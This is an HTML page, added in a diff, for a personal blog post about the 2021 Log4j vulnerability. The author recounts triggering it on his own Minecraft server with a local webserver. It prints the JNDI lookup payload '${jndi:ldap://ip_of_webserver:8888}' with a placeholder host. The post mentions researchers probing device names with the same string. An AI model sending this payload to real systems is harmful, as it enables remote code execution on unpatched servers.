@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+
+    <div>
+        <meta name="viewport" content="width=device-width, inital-scale1.0">
+        <meta name="description" content="Andrew Gugger's personal website">
+        <meta name="keyword" content="Andrew Gugger, resume, rowing, greenwich, University of Delaware">
+        <meta name="google-site-verification" content="r9g6r2oWrgl4FlAF0dcAOmduiXIL7HfL2aExopRPxU4">
+        <script type="text/javascript" src="https://platform.linkedin.com/badges/js/profile.js" async defer></script>
+    </div>
+    <title>
+        Andrew Gugger
+    </title>
+    
+</head>
+
+<body>
+  
+    <header>
+        <div class="my-header" id="upup">
+            <div class="space">
+                <div class="not-active">
+                    <a href="index.html">HOME</a>
+                    <!--<a href="contact.html">CONTACT</a> -->
+                </div>
+                <a class="active" href="blog.html">BLOG</a>
+                <div class="not-active">
+                    <a href="resume.html">RESUME</a>
+                    <a href="about.html">ABOUT</a>
+                    <!--<a href="contact.html">CONTACT</a> -->
+                </div>
+            </div>
+            <span>
+                
+                <strong>ANDREW GUGGER</strong>
+                
+            </span>
+                
+        </div>
+            
+    </header>
+
+    <br/>
+    <br/>
+
+
+    
+    <div class="projects" id="projects">
+        <span class="titles">
+            <h2 class="blogTitle">
+                Log4J
+            </h2>
+        </span>
+        <span class="titles">
+            <h3>
+                12/19/2021
+            </h3>
+        </span>
+        <div>
+            <img src="log.jpg" alt="log4j image">
+        </div>
+        <br/>
+        <p class = 'project_description'>
+            On Friday, 12/10/2021, a major vulnerability that allowed for unauthenticated remote code execution (RCE) through a very popular Java logging library known as Log4J went viral and 
+            set the whole internet on fire. A few weeks before, on November 24th, the vulnerability was discovered by a member of Alibaba's cloud security team who then reported the zero-day to Apache.
+            Talk of the vulnerability went viral on December 9th after the issue was made public on the project's GitHub. The scope of the vulnerability is unlike anything that anyone in cyber/development
+            has seen before.
+            </br>
+            </br>
+            I was able to recreate the vulnerability by spinning up a Minecraft server on my network and running a local Django webserver off my laptop. The Minecraft server was running version 1.17.1 which
+            was a stable release that had come out on 7/6/2021 and was one version behind the latest version (as of doing this experiment) 1.18 (released on 11/30/2021). In the image above, the terminal on the left
+            shows the Minecraft server and you can see a message I had passed in the chat "test". The window on the right shows the Django webserver waiting for requests to come in. From here I was able to pass in
+            ${jndi:ldap://ip_of_webserver:8888} into the chat. If the vulnerability didn't exist on this version of Minecraft, that message should be entered into the chat just like any other message
+            and no request should be made to the webserver. Since Minecraft uses Log4j to handle the messages and commands that get passed into the chat AND when I did this there was no patch for the vulnerability,
+            the message was executed as raw code by the Minecraft server. Which you can see occur in the image below: 
+            
+             
+            </br>
+            </br>
+            
+            
+            
+          
+        </p>
+
+        <div>
+            <img src="request.jpg" alt="log4j image request">
+        </div>
+
+        
+        <p class = 'project_description'>
+            The window on the right that contains the Django webserver that now has a bad HTTP request (code 400) that was made to it. It coincidentally also made my Minecraft server crash but what is important to note
+            was that this was accomplished on a totally vanilla version of Minecraft that I was running and this vulnerability worked out of the box, no assembly required. The same night that I recreated this vulnerability,
+            Minecraft released a patch for it, 1.18.1, as did many other companies and applications that use Log4j. 
+        </p>
+        
+        <div>
+            <img src="meme1.jpg" alt="log4j image meme"id=meme>
+        </div>
+
+        <p class = 'project_description'></p>
+            When the news of the vulnerability broke on Twitter there everyone was running tests on their devices and applications
+            to see if they were vulnerable. Some researchers changed the name of their iPhones, Airpods, and Teslas to ${jndi:ldap://ip_of_webserver:port} and got confirmation that the remote code execution (RCE) had been successful on those companies servers. 
+
+            </br>
+            </br>
+            Affecting millions of applications around the world and easy enough for <strong>anyone</strong> to do, I think we may feel the effects of this vulnerability for years. 
+
+        </p>
+
+        <div>
+            <img src="meme2.png" alt="log4j image meme" id=meme>
+        </div>
+
+ 
+
+        <div>
+            <img src="meme4.jpg" alt="log4j image meme"id=meme>
+        </div>
+        
+    </div>
+    
+</body>
+
+
+
+
+
+
+</html>
